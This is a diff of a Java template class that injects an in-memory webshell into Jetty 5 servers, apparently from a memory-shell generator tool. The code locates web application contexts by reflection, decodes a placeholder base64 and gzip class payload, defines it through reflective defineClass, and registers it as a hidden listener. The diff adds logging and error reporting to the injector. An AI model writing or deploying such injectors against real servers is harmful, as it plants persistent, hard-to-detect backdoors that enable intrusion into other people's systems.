@@ -3,6 +3,7 @@ package org.leo.jmg.mem.injectortpl.jetty5;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Array;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
@@ -15,34 +16,64 @@ import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
- * @author ReaJason
  * @since 2026/7/4
  */
-    public class Jetty5ListenerInjector {
+public class Jetty5ListenerInjector {
 
-    private static boolean ok;
-    private static String shellClassName;
-    private static String shellClass;
+    private static String msg = "";
+    private static boolean ok = false;
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() throws IOException {
+        return "{{base64Str}}";
+    }
 
     public Jetty5ListenerInjector() {
-        if (ok) return;
+        if (ok) {
+            return;
+        }
+        Set<Object> contexts = null;
         try {
-            Set<Object> contexts = getContext();
-            if (contexts != null) {
-                for (Object context : contexts) {
-                    try {
-                        Object shell = getShell(context);
-                        inject(context, shell);
-                    } catch (Throwable ignored) {
-                    }
+            contexts = getContext();
+        } catch (Throwable throwable) {
+            msg += "context error: " + getErrorMessage(throwable);
+        }
+        if (contexts == null || contexts.isEmpty()) {
+            msg += "context not found";
+        } else {
+            for (Object context : contexts) {
+                try {
+                    msg += ("context: [" + getContextRoot(context) + "] ");
+                    Object shell = getShell(context);
+                    inject(context, shell);
+                    msg += "[/*] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
                 }
             }
-        } catch (Throwable ignored) {
-        } finally {
-            ok = true;
-            shellClass = null;
-            shellClassName = null;
         }
+        ok = true;
+        System.out.println(msg);
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(context, "getContextPath");
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
     }
 
     public void inject(Object context, Object listener) throws Exception {
@@ -61,6 +92,11 @@ import java.util.zip.GZIPInputStream;
         }
         ensureJsr154Filter(webApplicationHandler);
         syncJsr154Filter(webApplicationHandler);
+    }
+
+    @Override
+    public String toString() {
+        return msg;
     }
 
     /**
@@ -164,7 +200,7 @@ import java.util.zip.GZIPInputStream;
     }
 
     private boolean isInjectedListener(Object listener) {
-        return listener != null && listener.getClass().getName().contains(shellClassName);
+        return listener != null && listener.getClass().getName().contains(getClassName());
     }
 
     private void ensureJsr154Filter(Object webApplicationHandler) {
@@ -278,15 +314,16 @@ import java.util.zip.GZIPInputStream;
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz;
+        Class<?> clazz = null;
         try {
-            clazz = classLoader.loadClass(shellClassName);
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
+        msg += "[" + classLoader.getClass().getName() + "] ";
         return clazz.newInstance();
     }
 
@@ -385,4 +422,18 @@ import java.util.zip.GZIPInputStream;
         }
     }
 
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
+    }
 }
